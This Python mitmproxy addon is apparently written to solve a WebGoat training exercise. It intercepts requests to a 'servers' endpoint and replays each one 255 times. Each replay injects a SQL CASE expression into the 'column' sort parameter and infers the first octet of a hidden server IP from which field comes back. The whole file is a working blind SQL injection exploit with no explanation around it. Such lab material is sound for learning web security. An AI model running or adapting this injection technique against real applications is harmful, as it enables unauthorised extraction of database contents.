from urllib.parse import urlencode, urlparse
import collections

from mitmproxy import http
from mitmproxy import ctx

import requests
# server: webgoat-prd


COND = (
    "select true from servers where ip = '{num}.130.219.202' limit 1"
)




def perform_bulk_requests(request):
    base_url = request.url.split('?')[0]
    responses = collections.defaultdict(list)
    for num in range(1, 256):
        cond = COND.format(num=num)
        url = base_url + '?' + urlencode(
            {'column': f'(case when ({cond}) then mac else hostname end)'})
        response = requests.get(url, headers=request.headers)
        try:
            responses[response.json()[0]['hostname']].append(num)
        except:
            pass
    print(responses.keys())
    if len(responses.keys()) > 1:
        print(responses)



def request(flow: http.HTTPFlow) -> None:
    if 'servers' in flow.request.url:
        perform_bulk_requests(flow.request)
        print(flow.request.url)

def response(flow: http.HTTPFlow) -> None:
    return
